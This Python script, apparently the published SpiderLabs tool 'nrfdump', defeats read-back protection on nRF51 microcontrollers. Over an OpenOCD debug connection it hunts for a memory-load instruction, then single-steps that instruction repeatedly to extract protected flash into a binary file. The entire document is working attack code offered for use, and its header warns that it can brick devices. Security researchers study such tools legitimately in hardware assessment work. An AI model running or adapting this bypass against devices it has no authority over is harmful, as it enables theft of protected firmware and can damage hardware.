#!/usr/bin/env python
#
# nrfdump dumps memory of read-back protected nRF51 chips.
# It connects to OpenOCD GDB server, finds an instruction 
# that can be used to copy a memory address into a register 
# and dumps the memory by (ab)using this instruction.  
# Please be warned that for some (rather unusual) chip code 
# and/or memory configurations, running this script can have
# undesirable effects, ranging from the script not being able 
# to find a usable instruction to misconfiguration of the device 
# or even *BRICK*.
# Use at your own risk!
#
# forestmike @ SpiderLabs
# 2018/01/12
#
import telnetlib
import re
import sys
import struct
import time

class NrfDump:

    openocd_host = None
    openocd_port = None
    known_address = None
    known_value = None

    reg_in = None
    reg_out = None
    pc = None

    connection = None

    # this is for troubleshooting
    last_response = ''

    registers = ['r0', 'r1', 'r2', 'r3', 'r4', 'r5', 'r6', 'r7', 'r8', 'r9', 'r10', 'r11', 'r12', 'sp']

    def __init__(self, openocd_host, openocd_port):
        self.openocd_host = openocd_host
        self.openocd_port = openocd_port
        self.connection = telnetlib.Telnet()
        self.connection.open(self.openocd_host, self.openocd_port)
        #self.connection.set_debuglevel(10)
        print self.connection.read_until('> ')[:-2]

    def show_status(self):
        print "Known address: %s" % self.known_address
        print "Known value at the address: %s" % self.known_value
        print "Instruction address: %s" % hex(self.pc)
        print "Register in: %s" % self.reg_in
        print "Register out: %s" % self.reg_out

    def send_cmd(self, cmd):
        # print "[*] CMD: %s" % cmd
        self.connection.write(cmd + '\n')
        time.sleep(0.01)   # wait longer if you experience unexpected values
        self.last_response = self.connection.read_until('> ')
        return self.last_response[:-2]

    def read_rbpconf(self, addr = '0x10001004'):
        print "[*] Reading RBPCONF to establish known memory address / value..."
        resp = self.send_cmd('mdw %s' % addr)
        # print resp
        m = re.search(': ([0-9A-Fa-f]+)', resp)
        if m and m.group(1):
            self.known_address = '0x10001004'
            self.known_value = '0x' + m.group(1).upper()
            print "[***] RBPCONF is: %s" % self.known_value
        else:
            # exit if anything goes wrong
            print "mdw returned unexpected value for rbpconf: >%s<" % self.last_response
            sys.exit(1)

    def get_reg(self, reg):
        resp = self.send_cmd('reg %s' % reg)
        m = re.search('0x[0-9A-Fa-f]+', resp)
        if m and m.group(0):
            return m.group(0)
        else:
            # exit if anything goes wrong
            print "get_reg received unexpected input: >%s<" % self.last_response
            sys.exit(1)

    def set_reg(self, reg, val):
        # print "CMD: setting reg %s to %s" % (reg, val)
        self.send_cmd('reg %s %s' % (reg, val))

    def get_all_regs(self):
        resp = self.send_cmd('reg')
        allregs = ''
        for line in resp.splitlines():
            if re.search('\) (r[0-9]{1,2}|sp) \(', line):
                allregs = allregs + line + '\n'
        return allregs

    def set_all_regs(self, val):
        # print "CMD: setting all regs to %s" % val
        for reg in self.registers:
            self.set_reg(reg, val)

    def run_instr(self, pc):
        self.set_reg('pc', hex(pc))
        self.send_cmd('step')

    def check_regs(self):
        # send_cmd('reset halt')

        allregs = self.get_all_regs()
        # print allregs

        m = re.search('(r[0-9]|sp).*%s' % self.known_value, allregs)
        if m:
            self.reg_out = m.group(1)
            return True
        return False

    def find_pc(self):
        print "[*] Searching for usable instruction..."
        self.send_cmd('reset halt')
        pc = self.get_reg('pc')
        pc = int(pc, 16)

        found = False
        while not found:
            self.set_all_regs(self.known_address)
            print "[*] pc = %s" % hex(pc)
            self.run_instr(pc)
            found = self.check_regs()
            if not found:
                pc = pc + 2

        if found:
            self.pc = pc
            print "[***] Known value found in register %s for pc = %s" % (self.reg_out, hex(self.pc))
        # raw_input("continue...")

    def find_reg_in(self):
        print "[*] Checking which register is the source..."
        found = False
        for reg in self.registers:
            # raw_input('continue...')
            self.set_all_regs('0x00000000')
            print "[*] register: %s" % reg
            self.set_reg(reg, self.known_address)
            self.run_instr(self.pc)
            found = self.check_regs()
            if found:
                self.reg_in = reg
                print '[***] Found source register: %s' % reg
                break
        # reg_in not found -- exit
        if not found:
            print 'Input register not found...'
            sys.exit(1)

    def dump_fw(self, fname = None, from_addr=0x00000000, to_addr=0x00040000):
        self.send_cmd('reset halt')
        cur_addr = from_addr

        f = None
        if fname is not None:
            print "[*] Dumping memory (%s - %s) to output file: %s ..." % (hex(from_addr), hex(to_addr), fname)
            f = open(fname, "wb")

        while cur_addr <= to_addr:
            self.set_reg('pc', hex(self.pc))
            self.set_reg(self.reg_in, hex(cur_addr))
            self.run_instr(self.pc)

            val = self.get_reg(self.reg_out)
            print "%s: %s" % (hex(cur_addr), val)

            if f is not None:
                bindata = struct.pack('I', int(val, 16))
                f.write(bindata)

            cur_addr += 4

        if f is not None:
            f.close()

if __name__ == '__main__':
    nrf = NrfDump('localhost', 4444)
    nrf.read_rbpconf()
    nrf.find_pc()
    nrf.find_reg_in()

    print "\n[***] The state of the game:"
    nrf.show_status()
    print

    nrf.dump_fw("out.bin")


